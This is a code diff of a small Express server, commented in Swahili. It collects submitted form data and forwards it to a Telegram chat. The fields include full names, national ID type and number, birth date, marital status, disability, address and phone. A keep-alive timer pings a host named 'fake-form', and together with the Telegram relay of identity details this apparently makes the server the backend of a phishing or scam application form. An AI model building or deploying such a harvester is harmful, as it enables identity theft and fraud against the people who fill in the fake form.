@@ -1,58 +1,67 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const axios = require('axios');
-const cors = require('cors');
-require('dotenv').config();
+import express from "express";
+import fetch from "node-fetch";
+import cors from "cors";
+import dotenv from "dotenv";
 
+dotenv.config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middlewares
 app.use(cors());
-app.use(bodyParser.json());
+app.use(express.json());
 
-// Route ya kupokea form
-app.post('/submit', async (req, res) => {
-    const data = req.body;
+// Endpoint ya kupokea form data
+app.post("/submit", async (req, res) => {
+  const data = req.body;
 
-    // Tengeneza ujumbe mzuri wa kutuma kwa bot
-    const message = `
-Mpya Aliyejiunga:
+  const telegramMessage = `
+Mpya Form Imewasilishwa:
 
 Majina: ${data.names}
-Kitambulisho: ${data.id_type} - ${data.id_number}
+Aina ya Kitambulisho: ${data.id_type}
+Namba ya Kitambulisho: ${data.id_number}
 Tarehe ya Kuzaliwa: ${data.birth_day}/${data.birth_month}/${data.birth_year}
 Hali ya Ndoa: ${data.marital_status}
 Namba ya Dharura: ${data.emergency_contact}
 
-Kozi/Fani: ${data.course}
-Kazi aliyofanya: ${data.workplace || 'Hakuna'}
-Ana ulemavu: ${data.disability}
+Kozi: ${data.course}
+Uzoefu: ${data.workplace}
+Ulemavu: ${data.disability || 'hapana'}
 ${data.disability === 'ndio' ? `Aina ya Ulemavu: ${data.disability_type}` : ''}
 Anuani: ${data.address}
 Simu: ${data.phone}
-Muda wa Kazi: ${data.years_job}
-    `;
+Muda wa kazi: ${data.years_job}
+`;
 
-    try {
-        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-            chat_id: process.env.CHAT_ID,
-            text: message
-        });
-
-        res.status(200).send('Success');
-    } catch (error) {
-        console.error('Error sending message to Telegram:', error.message);
-        res.status(500).send('Error sending data');
-    }
+  try {
+    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: process.env.TELEGRAM_CHAT_ID,
+        text: telegramMessage,
+      }),
+    });
+    res.status(200).json({ message: "Form imetumwa kikamilifu." });
+  } catch (error) {
+    console.error("Telegram error:", error);
+    res.status(500).json({ message: "Imeshindikana kutuma Telegram." });
+  }
 });
 
-// Keep server alive kila dakika 5
-setInterval(() => {
-    console.log('Server iko hai (' + new Date().toLocaleTimeString() + ')');
-}, 5 * 60 * 1000);
+// Homepage (kuweza ku-ping server)
+app.get("/", (req, res) => {
+  res.send("Server is running...");
+});
 
-// Start server
+// Keep Alive Ping - kila dakika 5
+setInterval(() => {
+  fetch("https://fake-form-qc0f.onrender.com/")
+    .then(() => console.log("Keep alive ping successful"))
+    .catch(err => console.error("Keep alive error:", err));
+}, 5 * 60 * 1000); // 5 minutes
+
+// Kuwasha server
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+  console.log(`Server is listening on port ${PORT}`);
 });
